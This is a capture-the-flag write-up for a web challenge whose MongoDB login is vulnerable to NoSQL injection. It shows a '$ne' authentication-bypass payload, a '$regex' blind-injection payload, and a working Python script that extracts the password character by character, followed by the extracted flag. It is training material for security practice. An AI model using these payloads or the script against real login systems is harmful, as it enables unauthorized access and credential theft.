# Wild Goose Hunt

Challenge text:
```
Outdated Alien technology has been found by the human resistance. The system might contain sensitive information that could be of use to us. Our experts are trying to find a way into the system. Can you help?
```
Along with the [source code](web_wild_goose_hunt).

The website was a login system, and as we see in the source code, it uses MongoDB. Since I didn't see anything else special, I assumed we had to do [NoSQL injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection). 

I tried sending in one of the examples from PayloadsAllTheThings;
```json
{
    "username": {
        "$ne": null
    },
    "password": {
        "$ne": null
    }
}
```
And the server returned
```json
{
    "logged": 1,
    "message": "Login Successful, welcome back admin."
}
```
which confirmed that it was vulnerable to NoSQLI.

As I do not believe there was a way to get any output, I assumed it was blind NoSQLI. Further down on PayloadsAllTheThings I found a nice payload for this purpose. 
```json
{
    "username": {
        "$eq": "admin"
    },
    "password": {
        "$regex": ""
    }
}
```
This will log us in if the password regex matches, and fail if it doesn't. If the password for example matches the regex `^a`, we know it starts with `a`, we can then move onto the next character, and try all combinations, until we have the flag. To do this I wrote a Python script.

```py
import re
import requests

final = ""

for x in range(len(final), 100): 
    for y in range(0x20, 0x80): # for every x position, try the character y (0x20 - 0x7e are the "characters" in the ASCII table)
        if y == 0x7f:
            print("done!")
            __import__("sys").exit()
        
        y = chr(y)

        sqli = {
            "username": {"$eq": "admin"},
            "password": {"$regex": f"^{re.escape(final+y)}" } # we send in what we know of the current password + a 1 character guess
        }
        res = requests.post("http://138.68.177.159:31116/api/login", json=sqli).text 

        if "Login Failed" not in res: # if we successfully log in, we know the next character in the password
            final += y
            break
    print(final)
```
By letting this run for a little while, we can slowly extract the flag.
```
...

CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0n
CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng
CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng0
CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng0_
CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng0_b
CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng0_b3
CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng0_b3f
CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng0_b3f0
CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng0_b3f0r
CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng0_b3f0r3
CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng0_b3f0r3}
```